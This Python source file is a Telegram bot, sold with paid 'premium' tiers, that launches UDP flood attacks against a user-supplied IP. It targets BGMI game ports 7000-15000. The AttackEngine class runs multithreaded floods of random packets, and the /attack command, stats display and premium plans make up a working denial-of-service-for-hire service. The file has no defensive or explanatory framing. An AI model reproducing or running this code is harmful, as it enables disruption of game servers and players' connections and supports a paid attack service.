#!/usr/bin/env python3
"""
💎 PREMIUM BGMI ATTACK BOT 💎
Video System | Premium | Attack | Mute | Groups
"""

import asyncio
import json
import random
import os
import sys
import time
import socket
import threading
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ChatPermissions

# ═══════════════ CONFIG ═══════════════
import config

API_ID = config.API_ID
API_HASH = config.API_HASH
BOT_TOKEN = config.BOT_TOKEN
OWNER_ID = config.OWNER_ID
OWNER_USERNAME = config.OWNER_USERNAME

# ═══════════════ DATABASE FILES ═══════════════
VIDEO_DB = "videos.json"
GROUPS_DB = "groups.json"
USERS_DB = "users.json"

# ═══════════════ TIMEZONE ═══════════════
IST = pytz.timezone('Asia/Kolkata')

# ═══════════════ STYLES ═══════════════
LINE = "━━━━━━━━━━━━━━━━━━━"
LINE_BIG = "━━━━━━━━━━━━━━━━━━━━━━"
BOLD_START = "**"
BOLD_END = "**"

# ═══════════════ VIDEO TRACKING ═══════════════
used_video_ids = []

# ═══════════════ ERROR MESSAGES ═══════════════
def get_owner_button():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👑 Contact Owner", url=f"https://t.me/{OWNER_USERNAME}")]
    ])

UNAUTHORIZED_MSG = f"""
❌{LINE}❌
   ⛔️ **UNAUTHORIZED!** ⛔️
❌{LINE}❌

**Hey** {{user}}! 👋
**This bot is only for authorized users!** 🚫
**Contact owner for access!** 📌

{LINE_BIG}
🕐 {{time}}  •  📅 {{date}}
{LINE_BIG}
"""

# ═══════════════ DATABASE FUNCTIONS ═══════════════
def load_videos():
    try:
        if os.path.exists(VIDEO_DB):
            with open(VIDEO_DB, "r") as f:
                return json.load(f)
    except:
        pass
    return []

def save_video(video_path):
    videos = load_videos()
    video_id = len(videos) + 1
    videos.append({
        "id": video_id,
        "path": video_path,
        "timestamp": datetime.now(IST).isoformat(),
        "used": False,
        "name": os.path.basename(video_path)
    })
    with open(VIDEO_DB, "w") as f:
        json.dump(videos, f, indent=2)
    return video_id

def get_random_video():
    global used_video_ids
    videos = load_videos()
    if not videos:
        return None
    available = [v for v in videos if v["id"] not in used_video_ids]
    if not available:
        used_video_ids.clear()
        available = videos
    video = random.choice(available)
    used_video_ids.append(video["id"])
    if len(used_video_ids) > 20:
        used_video_ids = used_video_ids[-10:]
    return video

def get_video_count():
    return len(load_videos())

def delete_video_by_id(video_id):
    videos = load_videos()
    for i, video in enumerate(videos):
        if video["id"] == video_id:
            deleted = videos.pop(i)
            if os.path.exists(deleted["path"]):
                os.remove(deleted["path"])
            with open(VIDEO_DB, "w") as f:
                json.dump(videos, f, indent=2)
            if video_id in used_video_ids:
                used_video_ids.remove(video_id)
            return True
    return False

def load_users():
    try:
        if os.path.exists(USERS_DB):
            with open(USERS_DB, "r") as f:
                return json.load(f)
    except:
        pass
    return {"premium": [], "authorized": []}

def save_users(data):
    with open(USERS_DB, "w") as f:
        json.dump(data, f, indent=2)

def is_premium(user_id):
    users = load_users()
    return str(user_id) in users.get("premium", [])

def is_authorized(user_id):
    if user_id == OWNER_ID:
        return True
    users = load_users()
    return str(user_id) in users.get("authorized", []) or str(user_id) in users.get("premium", [])

def add_premium(user_id):
    users = load_users()
    if str(user_id) not in users.get("premium", []):
        users.setdefault("premium", []).append(str(user_id))
        save_users(users)
        return True
    return False

def remove_premium(user_id):
    users = load_users()
    if str(user_id) in users.get("premium", []):
        users["premium"].remove(str(user_id))
        save_users(users)
        return True
    return False

def add_authorized(user_id):
    users = load_users()
    if str(user_id) not in users.get("authorized", []):
        users.setdefault("authorized", []).append(str(user_id))
        save_users(users)
        return True
    return False

def load_groups():
    try:
        if os.path.exists(GROUPS_DB):
            with open(GROUPS_DB, "r") as f:
                return json.load(f)
    except:
        pass
    return {}

def save_group(group_id, group_name):
    groups = load_groups()
    groups[str(group_id)] = {
        "name": group_name,
        "added_at": datetime.now(IST).isoformat(),
        "enabled": True
    }
    with open(GROUPS_DB, "w") as f:
        json.dump(groups, f, indent=2)

def get_all_groups():
    return load_groups()

def is_group_enabled(group_id):
    groups = load_groups()
    return str(group_id) in groups and groups[str(group_id)].get("enabled", True)

def get_current_time():
    return datetime.now(IST).strftime("%I:%M:%S %p")

def get_current_date():
    return datetime.now(IST).strftime("%B %d, %Y")

def premium_badge(uid):
    if is_premium(uid) or uid == OWNER_ID:
        return "💎 **PREMIUM**"
    return "🆓 **FREE**"

def get_limit(uid, t):
    if is_premium(uid) or uid == OWNER_ID:
        return config.PREMIUM_THREADS if t == 'threads' else config.PREMIUM_TIME
    return config.FREE_THREADS if t == 'threads' else config.FREE_TIME

def get_bar(pct, length=15):
    filled = int(pct / 100 * length)
    return "█" * filled + "▒" * (length - filled)

def get_time_str(s):
    if s < 60: return f"{int(s)}s"
    m, sec = int(s//60), int(s%60)
    return f"{m}m {sec}s"

# ═══════════════ ATTACK ENGINE ═══════════════
class AttackEngine:
    def __init__(self):
        self.running = False
        self.pkts = 0
        self.bytes_out = 0
        self.errors = 0
        self.lock = threading.Lock()
    
    def flood(self, ip, port, end_time):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*10)
        sock.settimeout(0.0001)
        
        game_ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        
        while self.running and time.time() < end_time:
            try:
                for _ in range(20):
                    if not self.running: break
                    pkt = random.randbytes(random.randint(500, 1500))
                    sock.sendto(pkt, (ip, random.choice(game_ports)))
                    with self.lock:
                        self.pkts += 1
                        self.bytes_out += len(pkt)
            except:
                with self.lock: self.errors += 1
        sock.close()
    
    def start(self, ip, port, duration, threads):
        self.running = True
        self.pkts = 0
        self.bytes_out = 0
        self.errors = 0
        
        end_time = time.time() + duration
        workers = []
        
        for _ in range(threads):
            t = threading.Thread(target=self.flood, args=(ip, port, end_time))
            t.daemon = True; t.start()
            workers.append(t)
        
        time.sleep(duration)
        self.running = False
        
        for t in workers: t.join(timeout=0.1)
        
        elapsed = max(duration, 0.1)
        return {
            'pkts': self.pkts,
            'mb': self.bytes_out / 1024 / 1024,
            'mbps': (self.bytes_out * 8) / (elapsed * 1_000_000),
            'errors': self.errors
        }

attacker = AttackEngine()
attacking = False
attack_info = {}
attack_msg = None

# ═══════════════ BOT CREATE ═══════════════
print("🔧 Creating Premium Attack Bot...")
app = Client("premium_attack_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
print("✅ Bot created!")

# ═══════════════ KEYBOARDS ═══════════════
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 ATTACK MENU", callback_data="attack_menu")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("💎 PREMIUM", callback_data="premium"),
         InlineKeyboardButton("👤 PROFILE", callback_data="profile")],
        [InlineKeyboardButton("🎬 VIDEO MANAGER", callback_data="video_menu")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("👑 ADMIN", callback_data="admin"),
         InlineKeyboardButton("ℹ️ HELP", callback_data="help")],
    ])

def video_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 ADD VIDEO", callback_data="add_video")],
        [InlineKeyboardButton("📋 LIST VIDEOS", callback_data="list_videos")],
        [InlineKeyboardButton("🗑️ DELETE VIDEO", callback_data="del_video")],
        [InlineKeyboardButton("🧹 CLEAR ALL", callback_data="clear_videos")],
        [InlineKeyboardButton("📊 VIDEO STATS", callback_data="video_stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")],
    ])

def back_button():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])

# ═══════════════ START COMMAND ═══════════════
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    user = message.from_user
    uid = user.id
    
    if not is_authorized(uid):
        await message.reply_text(
            UNAUTHORIZED_MSG.format(
                user=user.first_name,
                time=get_current_time(),
                date=get_current_date()
            ),
            reply_markup=get_owner_button()
        )
        return
    
    # Get random video
    video = get_random_video()
    
    text = f"""
💎 **PREMIUM BGMI ATTACK BOT** 💎

{LINE}
👤 **User:** `{user.first_name}`
🆔 **ID:** `{uid}`
💳 **Plan:** {premium_badge(uid)}
{LINE}

⚡ **Power:** `{get_limit(uid, 'threads')}` Threads
⏱️ **Max Time:** `{get_limit(uid, 'time')}s`
📹 **Videos:** `{get_video_count()}`

🎯 **Attack:** `/attack IP PORT TIME`
📋 **Example:** `/attack 1.2.3.4 8080 120`

🔽 **Select Option:**
"""
    
    if video and os.path.exists(video["path"]):
        await app.send_video(
            message.chat.id,
            video["path"],
            caption=text,
            reply_markup=main_keyboard()
        )
    else:
        await message.reply_text(text, reply_markup=main_keyboard())

# ═══════════════ ATTACK COMMAND ═══════════════
@app.on_message(filters.command("attack") & filters.private)
async def attack_command(client, message):
    global attacking, attack_info, attack_msg
    
    uid = message.from_user.id
    
    if not is_authorized(uid):
        return await message.reply_text("❌ Access Denied!", reply_markup=get_owner_button())
    
    if not is_premium(uid) and uid != OWNER_ID:
        return await message.reply_text(
            f"💎 **PREMIUM REQUIRED!**\n\n"
            f"💰 Price: {config.PREMIUM_PRICE}\n"
            f"📲 Contact: @{OWNER_USERNAME}",
            reply_markup=get_owner_button()
        )
    
    if attacking:
        elapsed = time.time() - attack_info.get('start', 0)
        return await message.reply_text(
            f"⚠️ **ALREADY ATTACKING!**\n\n"
            f"🎯 `{attack_info.get('ip')}:{attack_info.get('port')}`\n"
            f"⏱️ `{int(elapsed)}s` elapsed\n\n"
            f"🛑 `/stop` to cancel"
        )
    
    parts = message.text.split()
    if len(parts) < 4:
        return await message.reply_text(
            f"⚠️ **USAGE:** `/attack IP PORT TIME`\n\n"
            f"📋 **Example:** `/attack 1.2.3.4 8080 120`\n"
            f"🎮 BGMI Ports: 7000-15000"
        )
    
    ip = parts[1]
    try: port = int(parts[2])
    except: return await message.reply_text("❌ Invalid port!")
    try: dur = int(parts[3])
    except: return await message.reply_text("❌ Invalid time!")
    
    max_t = get_limit(uid, 'time')
    threads = get_limit(uid, 'threads')
    
    if dur > max_t:
        return await message.reply_text(f"❌ Max: {max_t}s\n💎 Premium: {config.PREMIUM_TIME}s")
    
    attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time(), 'threads': threads}
    attacking = True
    
    # Get random video
    video = get_random_video()
    
    start_text = f"""
💀 **ATTACK LAUNCHED!** 💀

{LINE}
🎯 **Target:** `{ip}:{port}`
⏱️ **Duration:** `{get_time_str(dur)}`
🧵 **Threads:** `{threads}`
💳 **Plan:** {premium_badge(uid)}
{LINE}

⏳ Initializing attack...
🔄 Connecting to target...
📡 Sending BGMI packets...

🛑 `/stop` to cancel
"""
    
    if video and os.path.exists(video["path"]):
        msg = await app.send_video(message.chat.id, video["path"], caption=start_text)
    else:
        msg = await message.reply_text(start_text)
    
    attack_msg = msg
    
    # Live update task
    async def live_updates():
        start_t = time.time()
        last = 0
        
        while attacking:
            try:
                now = time.time()
                elapsed = now - start_t
                if elapsed >= dur: break
                if now - last < 2:
                    await asyncio.sleep(0.5)
                    continue
                
                last = now
                pct = (elapsed / dur) * 100
                mbps = (attacker.bytes_out * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
                
                live_box = f"""
💀 **ATTACKING!** 💀

{LINE}
🎯 `{ip}:{port}`
⏱️ `{get_time_str(elapsed)}` / `{get_time_str(dur)}`
{get_bar(pct)} `{pct:.1f}%`
{LINE}
📦 Packets: `{attacker.pkts:,}`
📤 Data: `{attacker.bytes_out/1024/1024:.1f} MB`
📶 Speed: `{mbps:.1f} Mbps`
❌ Errors: `{attacker.errors}`
{LINE}
💳 {premium_badge(uid)}
🛑 `/stop`
"""
                try:
                    await attack_msg.edit_text(live_box)
                except:
                    pass
                await asyncio.sleep(0.5)
            except:
                break
    
    asyncio.create_task(live_updates())
    
    # Run attack in thread
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    
    attacking = False
    attack_info = {}
    
    # Get random video for done
    video = get_random_video()
    
    done_box = f"""
✅ **ATTACK COMPLETED!** ✅

{LINE}
🎯 `{ip}:{port}`
⏱️ `{get_time_str(dur)}`
{LINE}
📊 **FINAL REPORT:**
📦 Packets: `{stats['pkts']:,}`
📤 Data: `{stats['mb']:.1f} MB`
📶 Speed: `{stats['mbps']:.1f} Mbps`
❌ Errors: `{stats['errors']}`
{LINE}
🟢 **SUCCESS!**
💀 **TARGET STRESSED!**
{LINE}

🔄 `/attack IP PORT TIME`
"""
    
    if video and os.path.exists(video["path"]):
        await attack_msg.edit_caption(done_box)
        await app.send_video(message.chat.id, video["path"], caption=done_box)
    else:
        await attack_msg.edit_text(done_box)

# ═══════════════ STOP COMMAND ═══════════════
@app.on_message(filters.command("stop") & filters.private)
async def stop_command(client, message):
    global attacking, attack_info
    
    if not is_authorized(message.from_user.id):
        return
    
    if attacking:
        attacker.running = False
        elapsed = time.time() - attack_info.get('start', 0)
        attacking = False
        
        await message.reply_text(
            f"⛔ **ATTACK STOPPED!**\n\n"
            f"🎯 `{attack_info.get('ip')}:{attack_info.get('port')}`\n"
            f"⏱️ Ran: `{int(elapsed)}s`\n"
            f"📦 Packets: `{attacker.pkts:,}`\n\n"
            f"🔄 `/attack IP PORT TIME`"
        )
        attack_info = {}
    else:
        await message.reply_text("💤 **No attack running!**")

# ═══════════════ STATUS COMMAND ═══════════════
@app.on_message(filters.command("status") & filters.private)
async def status_command(client, message):
    if not is_authorized(message.from_user.id):
        return
    
    if attacking:
        elapsed = time.time() - attack_info['start']
        mbps = (attacker.bytes_out * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
        
        await message.reply_text(
            f"📊 **LIVE STATUS**\n\n"
            f"🟢 **ATTACKING!**\n"
            f"🎯 `{attack_info['ip']}:{attack_info['port']}`\n"
            f"⏱️ `{int(elapsed)}s` / `{attack_info['time']}s`\n"
            f"📦 `{attacker.pkts:,}` packets\n"
            f"📶 `{mbps:.1f}` Mbps"
        )
    else:
        await message.reply_text("💤 **IDLE**\n\n⚔️ `/attack IP PORT TIME`")

# ═══════════════ VIDEO COMMANDS ═══════════════
@app.on_message(filters.command("addvideo") & filters.private)
async def add_video(client, message):
    if not is_authorized(message.from_user.id):
        return
    
    status = await message.reply_text("⏳ **Downloading video...**")
    
    try:
        if message.reply_to_message and message.reply_to_message.video:
            path = await message.reply_to_message.download()
            vid_id = save_video(path)
            await status.edit_text(
                f"✅ **VIDEO ADDED!**\n\n"
                f"🆔 **ID:** `{vid_id}`\n"
                f"📹 **Total:** `{get_video_count()}`\n\n"
                f"🎲 Video will play randomly!"
            )
        else:
            await status.edit_text("❌ **Reply to a video!**")
    except Exception as e:
        await status.edit_text(f"❌ **Error:** {str(e)}")

@app.on_message(filters.command("videos") & filters.private)
async def list_videos(client, message):
    if not is_authorized(message.from_user.id):
        return
    
    videos = load_videos()
    if not videos:
        return await message.reply_text("📹 **No videos!** Use `/addvideo` to add.")
    
    text = f"🎬 **VIDEOS** ({len(videos)}):\n\n{LINE}\n"
    for v in videos[:20]:
        text += f"#{v['id']} 📹 `{v['name'][:30]}`\n"
    
    if len(videos) > 20:
        text += f"\n... and {len(videos) - 20} more!"
    
    text += f"\n{LINE}\n📹 **Total:** `{len(videos)}`"
    
    await message.reply_text(text)

@app.on_message(filters.command("delvideo") & filters.private)
async def delete_video(client, message):
    if not is_authorized(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ **Usage:** `/delvideo ID`")
    
    try:
        vid = int(parts[1])
        if delete_video_by_id(vid):
            await message.reply_text(f"✅ **Video #{vid} deleted!**")
        else:
            await message.reply_text("❌ **Not found!**")
    except:
        await message.reply_text("❌ **Invalid ID!**")

@app.on_message(filters.command("clearvideos") & filters.private)
async def clear_videos(client, message):
    if not is_authorized(message.from_user.id):
        return
    
    videos = load_videos()
    if not videos:
        return await message.reply_text("📹 **No videos!**")
    
    for v in videos:
        if os.path.exists(v["path"]):
            os.remove(v["path"])
    
    with open(VIDEO_DB, "w") as f:
        json.dump([], f)
    
    await message.reply_text(f"🗑️ **{len(videos)} videos cleared!**")

# ═══════════════ PREMIUM COMMANDS ═══════════════
@app.on_message(filters.command("addpremium") & filters.private)
async def add_prem_cmd(client, message):
    if message.from_user.id != OWNER_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ `/addpremium USER_ID`")
    
    if add_premium(parts[1]):
        await message.reply_text(f"✅ User `{parts[1]}` is now 💎 PREMIUM!")
    else:
        await message.reply_text("Already premium!")

@app.on_message(filters.command("removepremium") & filters.private)
async def rem_prem_cmd(client, message):
    if message.from_user.id != OWNER_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ `/removepremium USER_ID`")
    
    if remove_premium(parts[1]):
        await message.reply_text(f"✅ Premium removed from `{parts[1]}`")
    else:
        await message.reply_text("Not premium!")

@app.on_message(filters.command("adduser") & filters.private)
async def add_user_cmd(client, message):
    if message.from_user.id != OWNER_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        return await message.reply_text("❌ `/adduser USER_ID`")
    
    if add_authorized(parts[1]):
        await message.reply_text(f"✅ User `{parts[1]}` authorized!")
    else:
        await message.reply_text("Already authorized!")

# ═══════════════ STATS COMMAND ═══════════════
@app.on_message(filters.command("stats") & filters.private)
async def stats_cmd(client, message):
    if not is_authorized(message.from_user.id):
        return
    
    videos = load_videos()
    users = load_users()
    groups = get_all_groups()
    
    total_size = 0
    for v in videos:
        if os.path.exists(v["path"]):
            total_size += os.path.getsize(v["path"])
    
    text = f"""
📊 **BOT STATISTICS**

{LINE}
📹 **Videos:** `{len(videos)}`
💾 **Size:** `{total_size / (1024*1024):.1f} MB`
{LINE}
💎 **Premium Users:** `{len(users.get('premium', []))}`
✅ **Authorized:** `{len(users.get('authorized', []))}`
{LINE}
👥 **Groups:** `{len(groups)}`
{LINE}
🕐 **Time:** {get_current_time()}
📅 **Date:** {get_current_date()}
{LINE}
💎 **Premium Active!**
"""
    await message.reply_text(text)

# ═══════════════ CALLBACK HANDLERS ═══════════════
@app.on_callback_query()
async def callback_handler(client, callback_query):
    data = callback_query.data
    uid = callback_query.from_user.id
    
    if data == "sep":
        await callback_query.answer("━" * 20)
        return
    
    if data == "back":
        await start_command(client, callback_query.message)
        return
    
    if data == "attack_menu":
        await callback_query.message.edit_text(
            f"💀 **ATTACK MENU**\n\n"
            f"{LINE}\n"
            f"⚔️ `/attack IP PORT TIME`\n"
            f"📋 `/attack 1.2.3.4 8080 120`\n"
            f"{LINE}\n"
            f"🎮 BGMI: 7000-15000\n"
            f"⚡ {get_limit(uid, 'threads')} Threads\n"
            f"⏱️ {get_limit(uid, 'time')}s Max\n"
            f"{LINE}",
            reply_markup=back_button()
        )
    
    elif data == "status":
        if attacking:
            elapsed = time.time() - attack_info['start']
            await callback_query.answer(
                f"🟢 Attacking! {int(elapsed)}s | {attacker.pkts:,} packets",
                show_alert=True
            )
        else:
            await callback_query.answer("💤 IDLE", show_alert=True)
    
    elif data == "stop":
        if attacking:
            attacker.running = False
            await callback_query.answer("⛔ Stopped!", show_alert=True)
        else:
            await callback_query.answer("💤 No attack", show_alert=True)
    
    elif data == "premium":
        await callback_query.message.edit_text(
            f"💎 **PREMIUM FEATURES**\n\n"
            f"{LINE}\n"
            f"⚡ `{config.PREMIUM_THREADS}` Threads\n"
            f"⏱️ `{config.PREMIUM_TIME}s` Max Time\n"
            f"🎬 `{get_video_count()}` Videos\n"
            f"👑 Priority Support\n"
            f"💀 5x More Power\n"
            f"{LINE}\n"
            f"💰 Price: `{config.PREMIUM_PRICE}`\n"
            f"📲 Contact: @{OWNER_USERNAME}\n"
            f"{LINE}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📲 CONTACT", url=f"https://t.me/{OWNER_USERNAME}")],
                [InlineKeyboardButton("🔙 BACK", callback_data="back")],
            ])
        )
    
    elif data == "profile":
        await callback_query.message.edit_text(
            f"👤 **PROFILE**\n\n"
            f"{LINE}\n"
            f"🆔 `{uid}`\n"
            f"👤 {callback_query.from_user.first_name}\n"
            f"💳 {premium_badge(uid)}\n"
            f"⚡ {get_limit(uid, 'threads')} Threads\n"
            f"⏱️ {get_limit(uid, 'time')}s Max\n"
            f"{LINE}",
            reply_markup=back_button()
        )
    
    elif data == "video_menu":
        await callback_query.message.edit_text(
            f"🎬 **VIDEO MANAGER**\n\n"
            f"{LINE}\n"
            f"📹 **Total Videos:** `{get_video_count()}`\n"
            f"{LINE}\n"
            f"📤 `/addvideo` - Add (reply to video)\n"
            f"📋 `/videos` - List all\n"
            f"🗑️ `/delvideo ID` - Delete\n"
            f"🧹 `/clearvideos` - Clear all\n"
            f"{LINE}",
            reply_markup=video_keyboard()
        )
    
    elif data == "add_video":
        await callback_query.answer("Reply to a video with /addvideo", show_alert=True)
    
    elif data == "list_videos":
        await list_videos(client, callback_query.message)
    
    elif data == "del_video":
        await callback_query.answer("Use: /delvideo ID", show_alert=True)
    
    elif data == "clear_videos":
        await clear_videos(client, callback_query.message)
    
    elif data == "video_stats":
        videos = load_videos()
        total_size = sum(os.path.getsize(v["path"]) for v in videos if os.path.exists(v["path"]))
        await callback_query.answer(
            f"📹 {len(videos)} videos | 💾 {total_size/(1024*1024):.1f} MB",
            show_alert=True
        )
    
    elif data == "admin":
        await callback_query.message.edit_text(
            f"👑 **ADMIN PANEL**\n\n"
            f"{LINE}\n"
            f"`/addpremium USER_ID`\n"
            f"`/removepremium USER_ID`\n"
            f"`/adduser USER_ID`\n"
            f"`/stats`\n"
            f"{LINE}",
            reply_markup=back_button()
        )
    
    elif data == "help":
        await callback_query.message.edit_text(
            f"ℹ️ **HELP**\n\n"
            f"{LINE}\n"
            f"⚔️ `/attack IP PORT TIME`\n"
            f"🛑 `/stop`\n"
            f"📊 `/status`\n"
            f"📹 `/addvideo` (reply)\n"
            f"📋 `/videos`\n"
            f"🗑️ `/delvideo ID`\n"
            f"💎 `/addpremium ID`\n"
            f"{LINE}\n"
            f"🎮 BGMI: 7000-15000\n"
            f"{LINE}",
            reply_markup=back_button()
        )

# ═══════════════ MAIN ═══════════════
if __name__ == "__main__":
    print("\n" + "="*50)
    print("💎 PREMIUM BGMI ATTACK BOT")
    print("🎬 Video System | 💀 Attack | 👑 Premium")
    print("="*50 + "\n")
    
    # Create DB files
    for db_file in [VIDEO_DB, GROUPS_DB, USERS_DB]:
        if not os.path.exists(db_file):
            with open(db_file, "w") as f:
                json.dump({} if db_file != VIDEO_DB else [], f)
    
    os.makedirs("downloads", exist_ok=True)
    
    print(f"📹 Videos: {get_video_count()}")
    print(f"💎 Premium System: Active")
    print(f"💀 Attack System: Ready")
    print("\n" + "="*50)
    print("🤖 BOT IS RUNNING!")
    print("="*50 + "\n")
    
    try:
        app.run()
    except Exception as e:
        print(f"\n❌ ERROR: {e}\n")
